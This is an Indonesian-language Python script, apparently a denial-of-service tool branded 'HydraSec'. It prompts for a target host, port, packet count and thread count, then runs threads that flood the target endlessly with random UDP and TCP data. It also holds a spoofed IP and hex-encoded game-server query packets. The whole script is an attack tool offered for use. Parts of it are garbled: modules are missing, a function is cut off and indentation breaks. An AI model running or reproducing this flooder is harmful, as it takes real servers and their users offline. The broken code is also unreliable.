#HAYO YANG DECODE MAU NYOLONG YA?
#AUTHOR : ACEE
#DIA MOOD BOOSTER :)
import random
import socket
import threading
import os
import sys
import getpass

nicknm = "HydraSec"

os.system("clear")
print("""
\033[36m
╦ ╦╦ ╦╔╦╗╦═╗╔═╗  ╔═╗╔═╗╔═╗
╠═╣╚╦╝ ║║╠╦╝╠═╣  ╚═╗║╣ ║  
╩ ╩ ╩ ═╩╝╩╚═╩ ╩  ╚═╝╚═╝╚═╝
""")

ip = str(input(" IP/HOST :"))
port = int(input(" PORT :"))
choice = str(input(" GASKEN DI DDOS? (y/n):"))
times = int(input(" JUMLAH PACKET :"))
threads = int(input(" JUMLAH THREADS :"))
fake_ip = '158.69.5.116' #fake ip
cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(666,2109))
		sys.stdout.write("\x1b]20ACEE. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[36m[\033[36m{}\033[37m@Acee\033[36m]\033[32m$ \033[36m".format(nicknm)).lower()
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def hydra():
	data = random._urandom(1204)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Your Attack Has Been Launched!!!")
		except:
			print("[!] Error!!!")

def hydra2():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Your Attack Has Been Launched!!!")
		except:
			s.close()
			print("[*] Error")
            

def hydra3():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Your Attack Has Been Launched!!!")
		except:
			s.close()
			print("[*] Error")
            
  
def hydra4():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Your Attack Has Been Launched!!!")
		except:
			s.close()
			print("[*] Error")
            
  
def hydra5():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Your Attack Has Been Launched!!!")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = hydra)
		th.start()
		th = threading.Thread(target = hydra2)
		th.start()
		th = threading.Thread(target = hydra3)
		th.start()
		th = threading.Thread(target = hydra4)
		th.start()
else:
		th = threading.Thread(target = hydra5)
		th.start()